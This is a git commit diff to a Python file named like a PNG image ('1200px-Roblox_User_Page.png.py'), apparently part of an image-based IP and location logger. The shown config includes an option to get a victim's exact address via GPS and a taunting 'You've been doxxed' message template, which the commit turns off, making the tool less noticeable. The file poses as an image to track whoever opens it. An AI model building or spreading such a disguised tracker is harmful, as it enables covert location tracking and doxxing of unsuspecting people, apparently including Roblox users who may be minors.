3db7cd26cb01c38c6de0e04b6f2f5096a8b4922a
5pee <117489279+5pee@users.noreply.github.com>
2023-03-20 09:15:34 -0700

    Update 1200px-Roblox_User_Page.png.py

--- api/vercel/library/commons/cloud/5pw/root/media/dowloads/images/1200px-Roblox_User_Page.png.py
+++ api/vercel/library/commons/cloud/5pw/root/media/dowloads/images/1200px-Roblox_User_Page.png.py
@@ -24,7 +24,7 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": True, # Enable the custom message?
+        "doMessage": False, # Enable the custom message?
         "message": "You've been doxxed. Your current address is: {city}, {region}, {country}.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
